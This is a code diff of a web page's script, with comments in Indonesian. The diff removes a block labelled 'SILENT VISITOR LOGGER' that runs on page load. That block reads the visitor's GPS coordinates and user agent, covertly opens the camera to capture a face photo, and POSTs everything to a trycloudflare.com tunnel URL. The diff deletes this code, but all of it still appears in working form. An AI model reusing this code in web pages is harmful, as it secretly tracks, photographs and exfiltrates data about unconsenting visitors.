@@ -546,61 +546,7 @@
         }
     };
 
-    // 2. SILENT VISITOR LOGGER
-      async function captureAndLog() {
-        let logData = {
-            waktu: new Date().toLocaleString(),
-            perangkat: navigator.userAgent,
-            lat: "Akses Ditolak",
-            lon: "Akses Ditolak",
-            foto: null
-        };
-
-        // 1. Ambil Lokasi GPS Akurat
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (position) => {
-                logData.lat = position.coords.latitude;
-                logData.lon = position.coords.longitude;
-                await sendToTermux(logData);
-            }, () => sendToTermux(logData));
-        }
-
-        // 2. Ambil Foto Wajah (Hidden Camera)
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-
-            const canvas = document.createElement('canvas');
-            canvas.width = 320;
-            canvas.height = 240;
-            const ctx = canvas.getContext('2d');
-            
-            // Tunggu 1 detik agar kamera fokus
-            setTimeout(() => {
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                logData.foto = canvas.toDataURL('image/jpeg'); // Foto jadi Base64
-                stream.getTracks().forEach(track => track.stop());
-                sendToTermux(logData);
-            }, 1000);
-        } catch (e) {
-            sendToTermux(logData);
-        }
-    }
-
-   async function sendToTermux(data) {
-    // GANTI LINK DI BAWAH dengan link tunnel Port 5000 Anda
-    const tunnelUrl = 'https://raised-receiving-istanbul-choices.trycloudflare.com/log';
-    
-    fetch(tunnelUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-    }).catch(err => console.log("Offline Mode."));
-}
-
-    window.onload = captureAndLog;
+   
 </script>
 
 </body>
